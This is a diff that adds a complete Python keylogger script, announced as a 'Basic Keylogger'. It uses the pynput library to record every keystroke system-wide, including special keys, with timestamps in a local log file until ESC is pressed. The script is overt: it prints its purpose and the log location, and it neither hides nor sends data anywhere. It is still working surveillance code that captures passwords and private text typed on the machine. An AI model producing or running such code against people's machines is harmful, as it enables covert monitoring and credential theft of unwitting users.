@@ -1,0 +1,59 @@
+from pynput import keyboard
+import datetime
+import os
+
+# Define the log file path
+LOG_FILE = "keylog.txt"
+
+def write_to_file(key):
+    """
+    Write the pressed key to the log file with timestamp
+    """
+    try:
+        # Convert key to string representation
+        with open(LOG_FILE, "a") as f:
+            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            # Handle special keys
+            if hasattr(key, 'char') and key.char is not None:
+                f.write(f"[{timestamp}] Key: {key.char}\n")
+            else:
+                f.write(f"[{timestamp}] Special Key: {str(key)}\n")
+    except Exception as e:
+        print(f"Error writing to file: {e}")
+
+def on_press(key):
+    """
+    Callback function for when a key is pressed
+    """
+    write_to_file(key)
+    # Return True to continue listening, False to stop
+    return True
+
+def on_release(key):
+    """
+    Callback function for when a key is released
+    """
+    # Stop listener if ESC is pressed
+    if key == keyboard.Key.esc:
+        print("Keylogger stopped.")
+        return False
+    return True
+
+def main():
+    print("=== Basic Keylogger ===")
+    print("Press ESC to stop the keylogger")
+    print(f"Keystrokes will be logged to: {os.path.abspath(LOG_FILE)}")
+    
+    # Clear the log file at start
+    if os.path.exists(LOG_FILE):
+        os.remove(LOG_FILE)
+    
+    # Create and start the keyboard listener
+    try:
+        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+            listener.join()
+    except KeyboardInterrupt:
+        print("\nKeylogger stopped by user.")
+
+if __name__ == "__main__":
+    main()
